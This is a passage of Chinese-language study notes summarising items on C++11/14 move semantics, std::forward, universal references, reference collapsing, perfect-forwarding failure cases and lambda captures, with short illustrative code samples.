//std::basic_string&lt;char&gt;的类型别名 … string(const string&amp; rhs); //拷贝构造函数 string(string&amp;&amp; rhs); //移动构造函数 …&#125;; 右值不能被传递给std::string的移动构造函数，因为移动构造函数只接受一个指向non-const的std::string的右值引用。 该右值却可以被传递给std::string的拷贝构造函数，因为lvalue-reference-to-const允许被绑定到一个const右值上。因此，std::string在成员初始化的过程中调用了拷贝构造函数。 可以总结出两点： 第一，不要在你希望能移动对象的时候，声明他们为const。 第二，std::move不仅不移动任何东西，而且它也不保证它执行转换的对象可以被移动。 std::forward 与std::move总是无条件的将它的实参为右值不同，std::forward是有条件的转换。 最常见的情景是一个模板函数，接收一个通用引用形参（T&amp;&amp;），并将它传递给另外的函数： 123456789101112void process(const Widget&amp; lvalArg); //处理左值void process(Widget&amp;&amp; rvalArg); //处理右值template&lt;typename T&gt; //用以转发param到process的模板void logAndProcess(T&amp;&amp; param)&#123; auto now = //获取现在时间 std::chrono::system_clock::now(); makeLogEntry(\"Calling 'process'\", now); process(std::forward&lt;T&gt;(param));&#125; 考虑两次对logAndProcess的调用，一次左值为实参，一次右值为实参： 1234Widget w;logAndProcess(w); //用左值调用logAndProcess(std::move(w)); //用右值调用 std::forward 将保留实参的值类型，传递到 process 函数，调用正确的函数重载。 对比 考虑一个类，我们希望统计有多少次移动构造函数被调用了。我们只需要一个static的计数器，它会在移动构造的时候自增。假设在这个类中，唯一一个非静态的数据成员是std::string，一种经典的移动构造函数（即，使用std::move）可以被实现如下： 123456789101112class Widget &#123;public: Widget(Widget&amp;&amp; rhs) : s(std::move(rhs.s)) &#123; ++moveCtorCalls; &#125; …private: static std::size_t moveCtorCalls; std::string s;&#125;; 如果要用std::forward来达成同样的效果，代码可能会看起来像： 123456789class Widget&#123;public: Widget(Widget&amp;&amp; rhs) //不自然，不合理的实现 : s(std::forward&lt;std::string&gt;(rhs.s)) &#123; ++moveCtorCalls; &#125; …&#125; std::forward不但需要一个函数实参（rhs.s），还需要一个模板类型实参std::string。 std::move的使用代表着无条件向右值的转换，而使用std::forward只对绑定了右值的引用进行到右值转换。这是两种完全不同的动作。前者是典型地为了移动操作，而后者只是传递（亦为转发）一个对象到另外一个函数，保留它原有的左值属性或右值属性。 结论 std::move执行到右值的无条件的转换，但就自身而言，它不移动任何东西。 std::forward只有当它的参数被绑定到一个右值时，才将参数转换为右值。 std::move和std::forward在运行期什么也不做。 24 区分通用引用与右值引用 为了声明一个指向某个类型T的右值引用，你写下了T&amp;&amp;。但是，这不一定是一个右值引用： 123456789void f(Widget&amp;&amp; param); //右值引用Widget&amp;&amp; var1 = Widget(); //右值引用auto&amp;&amp; var2 = var1; //不是右值引用template&lt;typename T&gt;void f(std::vector&lt;T&gt;&amp;&amp; param); //右值引用template&lt;typename T&gt;void f(T&amp;&amp; param); //不是右值引用 “T&amp;&amp;”有两种不同的意思。第一种，当然是右值引用。它们只绑定到右值上，并且它们主要的存在原因就是为了识别可以移动操作的对象。 “T&amp;&amp;”的另一种意思是，它既可以是右值引用，也可以是左值引用。它们的二重性使它们既可以绑定到右值上（就像右值引用），也可以绑定到左值上（就像左值引用）。 此外，它们还可以绑定到const或者non-const的对象上，也可以绑定到volatile或者non-volatile的对象上，甚至可以绑定到既const又volatile的对象上。它们可以绑定到几乎任何东西。它叫做通用引用（universal references）。 一些C++社区的成员已经开始将这种通用引用称之为转发引用（forwarding references） 通用引用，其特性是引用折叠决定的。 初始化 通用引用是引用，所以它们必须被初始化。一个通用引用的初始值决定了它是代表了右值引用还是左值引用。如果初始值是一个右值，那么通用引用就会是对应的右值引用，如果初始值是一个左值，那么通用引用就会是一个左值引用。对那些是函数形参的通用引用来说，初始值在调用函数的时候被提供： 123456789template&lt;typename T&gt;void f(T&amp;&amp; param); //param是一个通用引用Widget w;f(w); //传递给函数f一个左值；param的类型 //将会是Widget&amp;，也即左值引用f(std::move(w)); //传递给f一个右值；param的类型会是 //Widget&amp;&amp;，即右值引用 对一个通用引用而言，类型推导是必要的，但是其必须是 T&amp;&amp; 形式，如果是 std::vector&lt;T&gt;&amp;&amp; 的形式，那就变成了 右值引用。 而如果传入左值，那么是不能传入右值参数的。 一个例子 考虑如下push_back成员函数，来自std::vector： 1234567template&lt;class T, class Allocator = allocator&lt;T&gt;&gt; //来自C++标准class vector&#123;public: void push_back(T&amp;&amp; x); …&#125; push_back函数的形参当然有一个通用引用的正确形式，然而，在这里并没有发生类型推导。类型推导发生在 vector 实例化时。 作为对比，std::vector内的概念上相似的成员函数emplace_back，却确实包含类型推导: 1234567template&lt;class T, class Allocator = allocator&lt;T&gt;&gt; //依旧来自C++标准class vector &#123;public: template &lt;class... Args&gt; void emplace_back(Args&amp;&amp;... args); …&#125;; 类型参数（type parameter）Args是独立于vector的类型参数T的，所以Args会在每次emplace_back被调用的时候被推导。 所以，此时是一个通用引用。 auto&amp;&amp; 类型声明为auto&amp;&amp;的变量是通用引用，因为会发生类型推导，并且它们具有正确形式(T&amp;&amp;)。auto类型的通用引用不如函数模板形参中的通用引用常见，但是它们在C++11中常常突然出现。而它们在C++14中出现得更多，因为C++14的lambda表达式可以声明auto&amp;&amp;类型的形参。 举个例子，如果你想写一个C++14标准的lambda表达式，来记录任意函数调用的时间开销，你可以这样写： 123456789auto timeFuncInvocation = [](auto&amp;&amp; func, auto&amp;&amp;... params) //C++14 &#123; start timer; std::forward&lt;decltype(func)&gt;(func)( //对params调用func std::forward&lt;delctype(params)&gt;(params)... ); stop timer and record elapsed time; &#125;; 结论 如果一个函数模板形参的类型为type&amp;&amp;，并且type需要被推导得知，或者如果一个对象被声明为auto&amp;&amp;，这个形参或者对象就是一个通用引用。 如果类型声明的形式不是标准的type&amp;&amp;，或者如果类型推导没有发生，那么type&amp;&amp;代表一个右值引用。 通用引用，如果它被右值初始化，就会对应地成为右值引用；如果它被左值初始化，就会成为左值引用。 25 对右值引用使用std::move，对通用引用使用std::forward 在参数传递时，std::forward是有条件的传递，会根据参数的类型，传递实际的参数形式，右值还是右值，左值还是左值。 std::move是无条件的将其变为右值。 有的时候，并不一定需要对象的移动操作。区分移动和拷贝是有必要的。遇到下面这种情况： 12345678910class Widget &#123;public: void setName(const std::string&amp; newName) //用const左值设置 &#123; name = newName; &#125; void setName(std::string&amp;&amp; newName) //用右值设置 &#123; name = std::move(newName); &#125; …&#125;; 如果不用 通用引用，那么实现会变得冗长，尤其是参数数量较多的时候。 使用通用引用 + 完美转发 std::forward，那么实现会优雅得多。 并且对于变参函数模板： 12345template&lt;class T, class... Args&gt; //来自C++11标准shared_ptr&lt;T&gt; make_shared(Args&amp;&amp;... args);template&lt;class T, class... Args&gt; //来自C++14标准unique_ptr&lt;T&gt; make_unique(Args&amp;&amp;... args); 对于这种函数，对于左值和右值分别重载就不能考虑了：通用引用是仅有的实现方案。对这种函数，我向你保证，肯定使用std::forward传递通用引用形参给其他函数。 返回值的情况 如果你在按值返回的函数中，返回值绑定到右值引用或者通用引用上，需要对返回的引用使用std::move或者std::forward。 123456Matrix //按值返回operator+(Matrix&amp;&amp; lhs, const Matrix&amp; rhs)&#123; lhs += rhs; return std::move(lhs); //移动lhs到返回值中&#125; 通过在return语句中将lhs转换为右值（通过std::move），lhs可以移动到返回值的内存位置。如果省略了std::move调用， 123456Matrix //同之前一样operator+(Matrix&amp;&amp; lhs, const Matrix&amp; rhs)&#123; lhs += rhs; return lhs; //拷贝lhs到返回值中&#125; lhs是个左值的事实，会强制编译器拷贝它到返回值的内存空间。 假定Matrix支持移动操作，并且比拷贝操作效率更高，在return语句中使用std::move的代码效率更高。 如果Matrix不支持移动操作，将其转换为右值不会变差，因为右值可以直接被Matrix的拷贝构造函数拷贝。 使用通用引用和std::forward的情况类似。考虑函数模板reduceAndCopy收到一个未reduce（unreduced）对象Fraction，将其规约，并返回一个reduce (规约，好难听的名字) 后的副本。 如果原始对象是右值，可以将其移动到返回值中（避免拷贝开销），但是如果原始对象是左值，必须创建副本，因此如下代码： 1234567template&lt;typename T&gt;Fraction //按值返回reduceAndCopy(T&amp;&amp; frac) //通用引用的形参&#123; frac.reduce(); return std::forward&lt;T&gt;(frac); //移动右值，或拷贝左值到返回值中&#125; 如果std::forward被忽略，frac就被无条件复制到reduceAndCopy的返回值内存空间。 注意，对于函数内部的局部变量，这是不成立的。 123456Widget makeWidget() //makeWidget的“拷贝”版本&#123; Widget w; //局部对象 … //配置w return w; //“拷贝”w到返回值中&#125; 他们想要“优化”代码，把“拷贝”变为移动： 123456Widget makeWidget() //makeWidget的移动版本&#123; Widget w; … return std::move(w); //移动w到返回值中（不要这样做！）&#125; 因为有 RVO 的存在，makeWidget的“拷贝”版本实际上不拷贝任何东西。在返回的地址上，进行对象的构造。 但是 move 版本，不支持 RVO。 返回的已经不是局部对象w，而是w的引用——std::move(w)的结果。 结论 对于传入函数的形参，在函数内最后一次使用时，在右值引用上使用std::move，在通用引用上使用std::forward。 对按值返回的函数要返回的右值引用使用std::move，和通用引用使用std::forward。 如果局部对象可以被返回值优化消除，就绝不使用std::move或者std::forward。 26 避免重载通用引用 弊端一 比如，下面的例子： 1234567891011121314template&lt;typename T&gt;void logAndAdd(T&amp;&amp; name)&#123; auto now = std::chrono::system_clock::now(); log(now, \"logAndAdd\"); names.emplace(std::forward&lt;T&gt;(name));&#125;void logAndAdd(int idx) //新的重载&#123; auto now = std::chrono::system_clock::now(); log(now, \"logAndAdd\"); names.emplace(nameFromIdx(idx));&#125; 如果有以下调用： 123short nameIdx;logAndAdd(nameIdx); //错误！ 由于没有 short 类型的重载，但是有通用引用存在，所以name形参绑定到要传入的short上，然后name被std::forward给names（一个std::multiset&lt;std::string&gt;）的emplace成员函数，然后又被转发给std::string构造函数。std::string没有接受short的构造函数，所以logAndAdd调用里的multiset::emplace调用里的std::string构造函数调用失败。 所有这一切的原因就是对于short类型通用引用重载优先于int类型的重载。这导致了代码执行出错。 使用通用引用的函数在C++中是最贪婪的函数。它们几乎可以精确匹配任何类型的实参。 通用引用的实现会匹配比开发者预期要多得多的实参类型。 弊端二 有以下Person类： 12345678910111213class Person &#123;public: template&lt;typename T&gt; explicit Person(T&amp;&amp; n) //完美转发的构造函数，初始化数据成员 : name(std::forward&lt;T&gt;(n)) &#123;&#125; explicit Person(int idx) //int的构造函数 : name(nameFromIdx(idx)) &#123;&#125; …private: std::string name;&#125;; 函数模板能实例化产生与拷贝和移动构造函数一样的签名。如果拷贝和移动构造被生成，Person类看起来就像这样： 123456789101112class Person &#123;public: template&lt;typename T&gt; //完美转发的构造函数 explicit Person(T&amp;&amp; n) : name(std::forward&lt;T&gt;(n)) &#123;&#125; explicit Person(int idx); //int的构造函数 Person(const Person&amp; rhs); //拷贝构造函数 Person(Person&amp;&amp; rhs); //移动构造函数 …&#125;; 如果通过 non-const左值类型的Person 来拷贝构造一个新的对象，完美转发的构造函数会优先匹配。 如果通过 const左值类型的Person 来拷贝构造一个新的对象，拷贝构造函数会优先匹配，因为这是精确匹配。 如果在继承关系中，会有以下行为： 12345678910class SpecialPerson: public Person &#123;public: SpecialPerson(const SpecialPerson&amp; rhs) //拷贝构造函数，调用基类的 : Person(rhs) //基类的完美转发构造函数！ &#123; … &#125; SpecialPerson(SpecialPerson&amp;&amp; rhs) //移动构造函数，调用基类的 : Person(std::move(rhs)) //基类的完美转发构造函数！ &#123; … &#125;&#125;; 派生类的拷贝和移动构造函数没有调用基类的拷贝和移动构造函数，而是调用了基类的完美转发构造函数。 派生类将SpecialPerson类型的实参传递给其基类，然后通过模板实例化和重载解析规则作用于基类Person。最终，代码无法编译，因为std::string没有接受一个SpecialPerson的构造函数（只有完美转发构造函数初始化了 name ）。 结论 对通用引用形参的函数进行重载时，通用引用函数可匹配的类型，几乎总会比你期望的多得多。 完美转发构造函数是糟糕的实现，因为对于non-const左值，它们会优先于拷贝构造函数匹配，而且会劫持派生类对于基类的拷贝和移动构造函数的调用。 27 通用引用重载的替代方法 一个直接的思路，放弃重载，另外声明一个函数签名。 另一种思路，放弃重载，但是使用 lvalue-refrence-to-const 的方式，参数类型变为 const T&amp;。 放弃重载的另一种思路是，直接传值 + std::mov，的方式。 另外两种方案，保留了重载，但是都有局限，效率更高但是并不是万能的。这两种方案是：tag dispatch 和 enable_if 约束模板。 tag dispath 实现形式： 12345678910template&lt;typename T&gt;void logAndAdd(T&amp;&amp; name)&#123; logAndAddImpl( std::forward&lt;T&gt;(name), std::is_integral&lt;typename std::remove_reference&lt;T&gt;::type&gt;() // C++14 // std::is_integral&lt;std::remove_reference&lt;T&gt;&gt;() );&#125; 原来函数模板不变，但是将实际的函数调用，进行了分发（dispatch）。 之所以 remove_reference，是因为 T 可能被推导为左值 T&amp;，这不是 type trait std::is_integral 识别为真的类型。 分发实现为： 12345678910111213template&lt;typename T&gt; //非整型实参：添加到全局数据结构中void logAndAddImpl(T&amp;&amp; name, std::false_type) &#123; auto now = std::chrono::system_clock::now(); log(now, \"logAndAdd\"); names.emplace(std::forward&lt;T&gt;(name));&#125;std::string nameFromIdx(int idx); // 整型实参：查找名字并用它调用logAndAddvoid logAndAddImpl(int idx, std::true_type) &#123; logAndAdd(nameFromIdx(idx)); &#125; 这里的 std::false_type 和 std::true_type ，是 T 分别在不满足 std::is_integral和满足 std::is_integral 的情况下的父类。 enable_if 约束模板 tag dispath 并不能解决父类的通用引用重载函数的问题（见上一条款 26）。 enable_if 约束模板，基于以下机制： 默认情况下，所有模板是启用的（enabled），但是使用std::enable_if可以使得仅在std::enable_if指定的条件满足时模板才启用。不满足条件，模板就是被禁止（disabled）的。 首先解决传入 Person 类对象，导致通用引用重载中，string 用 Person 对象初始化报错的问题： 123456789101112131415// C++11class Person &#123;public: template&lt; typename T, typename = typename std::enable_if&lt; // !std::is_base_of&lt;Person, !std::is_base_of&lt;Person, typename std::decay&lt;T&gt;::type &gt;::value &gt;::type &gt; explicit Person(T&amp;&amp; n); …&#125;; 使用 type trait is_same ，可以在传入 Person 对象时，禁用模板。但是，传入子类对象，同样时不允许的，所以使用了 std::is_base_of。 std::decay&lt;T&gt; 去掉了对于T的引用，const，volatile修饰。 再结合对传入 int 类型参数的限制，可以的得到下面的代码： 123456789101112131415161718192021222324252627282930class Person &#123;public: template&lt; typename T, typename = std::enable_if_t&lt; !std::is_base_of&lt;Person, std::decay_t&lt;T&gt;&gt;::value &amp;&amp; !std::is_integral&lt;std::remove_reference_t&lt;T&gt;&gt;::value &gt; &gt; explicit Person(T&amp;&amp; n) : name(std::forward&lt;T&gt;(n)) //std::strings的实参的构造函数 &#123; //断言可以用T对象创建std::string static_assert( std::is_constructible&lt;std::string, T&gt;::value, \"Parameter n can't be used to construct a std::string\" ); ... &#125; explicit Person(int idx) //整型实参的构造函数 : name(nameFromIdx(idx)) &#123; … &#125; … //拷贝、移动构造函数等private: std::string name;&#125;; 其中： 12template&lt; bool B, class T = void &gt;using enable_if_t = typename enable_if&lt;B,T&gt;::type; // (since C++14) 这里的 static_assert 断言虽然可以识别，T 类型是否可以构建 string，但是这发生在 name(std::forward&lt;T&gt;(n)) 之后。所以，报错先于断言。 结论 通用引用重载的替代方法：使用不同的函数名，通过lvalue-reference-to-const传递形参，按值传递形参，使用tag dispatch，使用 enable_if 约束模板。 通用引用参数通常具有高效率的优势，但是其使用需要仔细分析。 28 引用折叠 目的就是禁止你生成引用的引用。 存在两种类型的引用（左值和右值），所以有四种可能的引用组合（左值的左值，左值的右值，右值的右值，右值的左值）。 这些组合的的结果：如果两个中任一引用为左值引用，则结果为左值引用。否则（即，如果引用都是右值引用），结果为右值引用。 组合 结果 左值的右值 左值 左值的左值 左值 右值的左值 左值 右值的右值 右值 std::forword实现 std::forward应用在通用引用参数上，所以经常能看到这样使用： 123456template&lt;typename T&gt;void f(T&amp;&amp; fParam)&#123; … //做些工作 someFunc(std::forward&lt;T&gt;(fParam)); //转发fParam到someFunc&#125; 因为fParam是通用引用，类型参数T的类型根据f被传入实参（即用来实例化fParam的表达式）是左值还是右值来决定。 std::forward的作用是当且仅当传给f的实参为右值时（此时T为非引用类型），才将fParam转化为一个右值。 std::forward可以这样实现： 12345template&lt;typename T&gt; //在std命名空间T&amp;&amp; forward(typename remove_reference&lt;T&gt;::type&amp; param)&#123; return static_cast&lt;T&amp;&amp;&gt;(param);&#125; 在C++14中，std::remove_reference_t的存在使得实现变得更简洁： 12345template&lt;typename T&gt; //C++14；仍然在std命名空间T&amp;&amp; forward(remove_reference_t&lt;T&gt;&amp; param)&#123; return static_cast&lt;T&amp;&amp;&gt;(param);&#125; 假设传入到f的实参是Widget的左值类型。T被推导为Widget&amp;，然后调用std::forward将实例化为std::forward&lt;Widget&amp;&gt;。 Widget&amp;带入到上面的std::forward的实现中： 123Widget&amp; &amp;&amp; forward(typename remove_reference&lt;Widget&amp;&gt;::type&amp; param)&#123; return static_cast&lt;Widget&amp; &amp;&amp;&gt;(param); &#125; std::remove_reference&lt;Widget&amp;&gt;::type这个type trait产生Widget ，所以std::forward成为： 12Widget&amp; &amp;&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp; &amp;&amp;&gt;(param); &#125; 根据引用折叠规则，返回值和强制转换可以化简，最终版本的std::forward调用就是： 12Widget&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp;&gt;(param); &#125; 当左值实参被传入到函数模板f时，std::forward被实例化为接受和返回左值引用。 如果传入右值，那么结果会是这样： 12Widget&amp;&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp;&amp;&gt;(param); &#125; auto 在auto的写法中，规则是类似的。声明 1auto&amp;&amp; w1 = w; 用一个左值初始化w1，因此为auto推导出类型Widget&amp;。把Widget&amp;代回w1声明中的auto里，产生了引用的引用， 1Widget&amp; &amp;&amp; w1 = w; 应用引用折叠规则，就是 1Widget&amp; w1 = w 结果就是w1是一个左值引用。 下面这个声明， 1auto&amp;&amp; w2 = widgetFactory(); 使用右值初始化w2，为auto推导出非引用类型Widget。把Widget代入auto得到： 1Widget&amp;&amp; w2 = widgetFactory() 没有引用的引用，这就是最终结果，w2是个右值引用。 通用引用 通用引用不是一种新的引用，它实际上是满足以下两个条件下的右值引用： 类型推导区分左值和右值。T类型的左值被推导为T&amp;类型，T类型的右值被推导为T。 发生引用折叠。 结论 引用折叠发生在四种情况下：模板实例化，auto类型推导，typedef与别名声明的创建和使用，decltype。 当编译器在引用折叠环境中生成了引用的引用时，结果就是单个引用。带有左值引用的引用折叠，结果就是左值引用。否则就是右值引用。 通用引用就是引用折叠的结果。 29 移动操作的缺点 升级C++11之前的代码 C++11倾向于为缺少移动操作的类生成它们，但是只有在没有声明复制操作，移动操作，析构函数的类中才会生成移动操作。 另外数据成员或者某类型的基类禁止移动操作，编译器不生成移动操作的支持。 所以，对于没有明确支持移动操作的类型，并且不符合编译器默认生成的条件的类，没有理由期望C++11会比C++98进行任何性能上的提升。 移动大对象 1234567std::vector&lt;Widget&gt; vm1;//把数据存进vw1…//把vw1移动到vw2。以常数时间运行。只有vw1和vw2中的指针被改变auto vm2 = std::move(vm1); std::array没有这种指针实现，数据就保存在std::array对象中： 1234567std::array&lt;Widget, 10000&gt; aw1;//把数据存进aw1…//把aw1移动到aw2。以线性时间运行。aw1中所有元素被移动到aw2auto aw2 = std::move(aw1); 移动还是遍历了所有元素。 移动小字符串 std::string提供了常数时间的移动操作和线性时间的复制操作。 许多字符串的实现采用了小字符串优化（small string optimization，SSO）。“小”字符串（比如长度小于15个字符的）存储在了std::string的缓冲区中，并没有存储在堆内存，移动这种存储的字符串并不比复制操作更快（并不会执行指针的复制，而是将字符串完全从一个位置拷贝到另一个位置，再清空原来的内存）。 结论 C++11的移动语义并无优势： 没有移动操作：要移动的对象没有提供移动操作，所以移动的写法也会变成复制操作。 移动不会更快：要移动的对象提供的移动操作并不比复制速度更快。 移动不可用：进行移动的上下文要求移动操作不会抛出异常，但是该操作没有被声明为noexcept。 源对象是左值：除了极少数的情况外，只有右值可以作为移动操作的来源。 30 完美转发失败的情况 完美转发（perfect forwarding）意味着我们不仅转发对象，我们还转发显著的特征：它们的类型，是左值还是右值，是const还是volatile。 有以下函数： 12345template&lt;typename... Ts&gt;void fwd(Ts&amp;&amp;... params) //接受任何实参&#123; f(std::forward&lt;Ts&gt;(params)...); //转发给f&#125; 讨论下面函数调用失败的情况： 12f( expression ); //调用f执行某个操作fwd( expression ); //但调用fwd执行另一个操作，则fwd不能完美转发expression给f 花括号初始化器 假定f这样声明： 1void f(const std::vector&lt;int&gt;&amp; v); 在这个例子中，用花括号初始化调用f通过编译， 1f(&#123; 1, 2, 3 &#125;); //可以，“&#123;1, 2, 3&#125;”隐式转换为std::vector&lt;int&gt; 但是传递相同的列表初始化给fwd不能编译 1fwd(&#123; 1, 2, 3 &#125;); //错误！不能编译 当通过调用函数模板fwd间接调用f时，编译器不再把调用地传入给fwd的实参和f的声明中形参类型进行比较。 而是推导传入给fwd的实参类型，然后比较推导后的实参类型和f的形参声明类型。 编译器不允许在对fwd的调用中推导表达式{ 1, 2, 3 }的类型，因为fwd的形参没有声明为std::initializer_list。对于fwd形参的推导类型被阻止，编译器只能拒绝该调用。 但是，使用花括号初始化的auto的变量的类型推导是成功的。这种变量被视为std::initializer_list对象，在转发函数应推导出类型为std::initializer_list的情况，这提供了一种简单的解决方法——使用auto声明一个局部变量，然后将局部变量传进转发函数： 12auto il = &#123; 1, 2, 3 &#125;; //il的类型被推导为std::initializer_list&lt;int&gt;fwd(il); //可以，完美转发il给f 0或者NULL 当你试图传递0或者NULL作为空指针给模板时，类型推导会出错，会把传来的实参推导为一个整型类型（典型情况为int）而不是指针类型。结果就是不管是0还是NULL都不能作为空指针被完美转发。解决方法非常简单，传一个nullptr而不是0或者NULL。 只有声明的 static const 数据成员 下面的代码： 123456789class Widget &#123;public: static const std::size_t MinVals = 28; //MinVal的声明 …&#125;;… //没有MinVals定义std::vector&lt;int&gt; widgetData;widgetData.reserve(Widget::MinVals); //使用MinVals 使用MinVals调用f是可以的，因为编译器直接将值28代替MinVals： 1f(Widget::MinVals); //可以，视为“f(28)” 不过如果我们尝试通过fwd调用f，事情不会进展那么顺利： 1fwd(Widget::MinVals); //错误！ 代码可以编译，但是不应该链接。 尽管代码中没有使用MinVals的地址，但是fwd的形参是通用引用。 而引用，在编译器生成的代码中，通常被视作指针。 在程序的二进制底层代码中（以及硬件中）指针和引用是一样的。在这个水平上，引用只是可以自动解引用的指针。在这种情况下，通过引用传递MinVals实际上与通过指针传递MinVals是一样的，因此，必须有内存使得指针可以指向。 链接时，链接不到内存，就会报错。 只要给整型static const提供一个定义，就可以解决问题了，比如这样： 1const std::size_t Widget::MinVals; //在Widget的.cpp文件 注意定义中不要重复初始化。如果在两个地方都提供了初始化，编译器就会报错，提醒你只能初始化一次。 重载函数的名称和模板名称 假设有了一个重载函数，processVal： 1234void f(int (*pf)(int));int processVal(int value);int processVal(int value, int priority); 传递给 f 是没问题的，因为编译器是可以基于现有信息判断调用哪一个重载函数的。 但是，fwd(processVal); 不行。 单用processVal是没有类型信息的，所以就不能类型推导，完美转发失败。 需要这样使用： 123456using ProcessFuncType = int (*)(int);ProcessFuncType processValPtr = processVal; //指定所需的processVal签名fwd(processValPtr); //可以fwd(static_cast&lt;ProcessFuncType&gt;(workOnVal)); //也可以 对于模板，有相似的问题。一个函数模板不代表单独一个函数，它表示一个函数族： 12345template&lt;typename T&gt;T workOnVal(T param) //处理值的模板&#123; … &#125;fwd(workOnVal); //错误！哪个workOnVal实例？ 要让像fwd的完美转发函数接受一个重载函数名或者模板名，方法是指定要转发的那个重载或者实例。 位域 IPv4的头部有如下模型：（假定位域是按从最低有效位（least significant bit，lsb）到最高有效位（most significant bit，msb） 12345678struct IPv4Header &#123; std::uint32_t version:4, IHL:4, DSCP:6, ECN:2, totalLength:16; …&#125;; 如果声明我们的函数f（转发函数fwd的目标）为接收一个std::size_t的形参，则使用IPv4Header对象的totalLength字段进行调用没有问题： 12345void f(std::size_t sz); //要调用的函数IPv4Header h;…f(h.totalLength); //可以 如果通过fwd转发h.totalLength给f呢，那就是一个不同的情况了： 1fwd(h.totalLength); //错误！ 问题在于fwd的形参是引用，而h.totalLength是non-const位域，这是C++不允许的行为。 位域可能包含了一个字的任意部分（比如32位int的3-5位），但是这些东西无法直接寻址。在硬件层面引用和指针是一样的，所以没有办法创建一个指向任意bit的指针。 传递位域给完美转发的方法就是，创建副本然后利用副本调用完美转发。在IPv4Header的例子中，可以如下写法： 1234//拷贝位域值auto length = static_cast&lt;std::uint16_t&gt;(h.totalLength);fwd(length); //转发这个副本 结论 导致完美转发失败的实参种类有：花括号初始化，作为空指针的0或者NULL，仅有声明的static const数据成员，模板和重载函数的名字，位域。 30 Lambda 表达式 闭包（enclosure）是lambda创建的运行时对象。依赖捕获模式，闭包持有被捕获数据的副本或者引用。 闭包类（closure class）是从中实例化闭包的类。每个lambda都会使编译器生成唯一的闭包类。lambda中的语句成为其闭包类的成员函数中的可执行指令。 lambda通常被用来创建闭包，该闭包仅用作函数的实参。闭包通常可以拷贝，所以可能有多个闭包对应于一个lambda。 但是对于闭包，需要明白的一点是：区分什么存在于编译期（lambdas 和闭包类），什么存在于运行时（闭包）以及它们之间的相互关系。 避免使用默认的捕获模式 按默认引用捕获会导致闭包中包含了对某个局部变量或者形参的引用。如果该lambda创建的闭包生命周期超过了局部变量，那么闭包中的引用将会变成悬空引用。 另外，成员函数中，使用捕获需要明白 this 指针的存在，直接捕获成员变量是会出错的。 一个解决方案是： 123456789void Widget::addFilter() const&#123; auto divisorCopy = divisor; //拷贝数据成员 filters.emplace_back( [divisorCopy](int value) //捕获副本 &#123; return value % divisorCopy == 0; &#125; //使用副本 );&#125; 在C++14中，一个更好的捕获成员变量的方式时使用通用的lambda捕获： 1234567void Widget::addFilter() const&#123; filters.emplace_back( //C++14： [divisor = divisor](int value) //拷贝divisor到闭包 &#123; return value % divisor == 0; &#125; //使用这个副本 );&#125; 如果是 static 成员，那么默认捕获行为将什么也不会捕获。 结论 默认的按引用捕获可能会导致悬空引用。 默认的按值捕获对于悬空指针很敏感（尤其是this指针），并且它会误导人产生lambda是独立的想法。 31 使用 init capture 来移动对象到闭包 在某些场景下，按值捕获和按引用捕获都不是你所想要的。如果你有一个只能被移动的对象（例如std::unique_ptr或std::future）要进入到闭包里，使用C++11是无法实现的。到了C++14就另一回事了，它能支持将对象移动到闭包中。 init capture C++14中，这是使用初始化捕获将std::unique_ptr移动到闭包中的方法： 123456789101112131415161718class Widget &#123; //一些有用的类型public: … bool isValidated() const; bool isProcessed() const; bool isArchived() const;private: …&#125;;auto pw = std::make_unique&lt;Widget&gt;(); //创建Widget；使用std::make_unique //的有关信息参见条款21… //设置*pwauto func = [pw = std::move(pw)] //使用std::move(pw)初始化闭包数据成员 &#123; return pw-&gt;isValidated() &amp;&amp; pw-&gt;isArchived(); &#125;; “pw = std::move(pw)”的意思是“在闭包中创建一个数据成员pw，并使用将std::move应用于局部变量pw的结果来初始化该数据成员”。 在C++11中，无法捕获表达式的结果。 因此，初始化捕获的另一个名称是通用lambda捕获（generalized lambda capture）。 lambda表达式只是生成一个类和创建该类型对象的一种简单方式而已。没什么是你用lambda可以做而不能自己手动实现的。 C++14的示例代码可以用C++11重新编写，如下所示： 123456789101112131415class IsValAndArch &#123; //“is validated and archived”public: using DataType = std::unique_ptr&lt;Widget&gt;; explicit IsValAndArch(DataType&amp;&amp; ptr) //条款25解释了std::move的使用 : pw(std::move(ptr)) &#123;&#125; bool operator()() const &#123; return pw-&gt;isValidated() &amp;&amp; pw-&gt;isArchived(); &#125; private: DataType pw;&#125;;auto func = IsValAndArch(std::make_unique&lt;Widget&gt;()); 使用 bind 的解决方法： C++11的等效代码如下，其中我强调了相同的关键事项： 12345678910std::vector&lt;double&gt; data; … auto func = std::bind( //C++11模拟初始化捕获 [](const std::vector&lt;double&gt;&amp; data) //译者注：本行高亮 &#123; /*使用data*/ &#125;, std::move(data) //译者注：本行高亮 ); 默认情况下，从lambda生成的闭包类中的operator()成员函数为const的。在lambda主体内把闭包中的所有数据成员渲染为const。 但是，bind对象内部的移动构造的data副本不是const的，因此，为了防止在lambda内修改该data副本，lambda的形参应声明为reference-to-const。 如果将lambda声明为mutable，则闭包类中的operator()将不会声明为const，并且在lambda的形参声明中省略const也是合适的： 123456auto func = std::bind( //C++11对mutable lambda [](std::vector&lt;double&gt;&amp; data) mutable //初始化捕获的模拟 &#123; /*使用data*/ &#125;, std::move(data) ); 结论 使用C++14的初始化捕获将对象移动到闭包中。 在C++11中，可以通过手写类或std::bind的方式来模拟初始化捕获。 33 对auto&amp;&amp;形参使用decltype 12auto f = [](auto&amp;&amp; x) &#123; return func(normalize(std::forward&lt;???&gt;(x))); &#125;; 这里的???该是什么？ 在泛型lambda中，没有可用的类型参数T。在lambda生成的闭包里，模版化的operator()函数中的确有一个T，但在lambda里却无法直接使用它。 如果一个左值实参被传给通用引用的形参，那么形参类型会变成左值引用。传递的是右值，形参就会变成右值引用。这意味着在这个lambda中，可以通过检查形参x的类型来确定传递进来的实参是一个左值还是右值，decltype就可以实现这样的效果。 传递给lambda的是一个左值，decltype(x)就能产生一个左值引用；如果传递的是一个右值，decltype(x)就会产生右值引用。 在调用std::forward时，惯例决定了类型实参是左值引用时来表明要传进左值，类型实参是非引用就表明要传进右值。 在前面的lambda中，如果x绑定的是一个左值，decltype(x)就能产生一个左值引用。 然而如果x绑定的是一个右值，decltype(x)就会产生右值引用，而不是常规的非引用。 但是decltype(x)就会产生右值引用传入 std::forward 后，引用折叠后的结果和传入非引用的结果是相同的。 所以decltype(x) 完美解决了问题。 C++14中的lambda也可以是可变形参的，最后的实现如下： 123456auto f = [](auto&amp;&amp;... params) &#123; return 